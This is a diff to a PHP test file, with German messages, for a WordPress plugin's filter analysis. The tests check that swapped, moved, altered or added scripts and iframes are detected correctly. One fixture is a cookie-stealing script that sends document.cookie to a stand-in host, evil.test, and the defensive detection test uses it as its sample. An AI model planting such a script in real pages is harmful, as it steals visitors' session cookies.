@@ -115,6 +115,36 @@ check(
 	'deshalb darf der Duplizier-Pfad nicht dieselbe Regel anwenden'
 );
 
+echo "\n\033[1mTausch statt Zaehlung\033[0m\n";
+
+// Counting occurrences had a hole: swap the page's own JSON-LD for a
+// script of the agent's making in one save and the total never moves.
+// The comparison is over the fragments themselves, so identity decides.
+$own = '<!-- wp:core/html --><script>fetch("https://evil.test?c="+document.cookie)</script><!-- /wp:core/html -->';
+$i   = wpmcp_kses_impact( $clean . $schema, $clean . $own );
+check(
+	true === $i['introduces'],
+	'ein ausgetauschtes Script wird erkannt, obwohl die Anzahl gleich bleibt',
+	'die Zaehlregel haette hier "nichts Neues" gemeldet'
+);
+
+// The same page, unchanged: nothing is introduced.
+$i = wpmcp_kses_impact( $clean . $schema, $clean . $schema );
+check( false === $i['introduces'], 'dasselbe Script an derselben Stelle ist nichts Neues' );
+
+// Moving an existing script elsewhere on the page is not introducing it.
+$i = wpmcp_kses_impact( $clean . $schema, $schema . $clean );
+check( false === $i['introduces'], 'ein verschobenes Script ist nichts Neues' );
+
+// One character changed inside an existing script is a different script.
+$i = wpmcp_kses_impact( $clean . $schema, $clean . str_replace( 'FAQPage', 'Article', $schema ) );
+check( true === $i['introduces'], 'ein geaenderter Script-Inhalt zaehlt als neu' );
+
+// What the message names is what is new, not everything present.
+$i = wpmcp_kses_impact( $clean . $schema, $clean . $schema . $frame );
+check( array( '<iframe' ) === $i['added'], 'gemeldet wird nur das Neue', implode( ', ', $i['added'] ) );
+check( count( $i['affected'] ) === 2, 'waehrend "betroffen" beides nennt', implode( ', ', $i['affected'] ) );
+
 echo "\n";
 if ( 0 === $fail ) {
 	echo "\033[32mFilter-Analyse in Ordnung.\033[0m\n";
